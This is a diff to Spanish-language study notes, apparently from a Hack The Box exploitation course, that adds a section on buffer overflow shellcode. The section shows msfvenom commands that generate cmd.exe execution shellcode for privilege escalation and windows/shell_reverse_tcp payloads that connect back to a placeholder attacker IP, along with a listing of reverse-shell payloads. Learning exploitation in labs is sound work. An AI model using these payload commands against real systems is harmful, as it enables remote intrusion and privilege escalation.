@@ -466,9 +466,7 @@ exploit()
 
 ### Obtener ejecución de código
 
-Lo que tenemos que hacer es cambiar nuestro shellcode para hacer otra cosa. Para la escalada de privilegios locales, podemos usar el mismo comando que usamos para `calc.exe`, pero `CMD=cmd.exe`en su lugar, use lo siguiente:
-
-  Saltar a Shellcode
+Lo que tenemos que hacer es cambiar nuestro shellcode para hacer otra cosa. Para la escalada de privilegios locales, podemos usar el mismo comando que usamos para `calc.exe`, pero `CMD=cmd.exe` en su lugar, use lo siguiente:
 
 ```shell-session
 0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'
@@ -480,12 +478,38 @@ buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
 ...SNIP...
 ```
 
+Si quisiéramos obtener un shell inverso, hay muchas `msfvenom` cargas útiles que podemos usar, de las cuales podemos obtener una lista de la siguiente manera:
 
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse
+
+...SNIP...
+    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
+    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
+    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+...SNIP...
+```
+
+Podemos utilizar la `windows/shell_reverse_tcp` carga útil de la siguiente manera:
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'
+
+...SNIP...
+buf =  b""
+buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
+...SNIP...
+```
 # Remote Buffer Overflow
 
 ## Fuzzing remoto
 
-
+### Depuración de un programa remoto
 
 
 ## Construyendo un exploit remoto
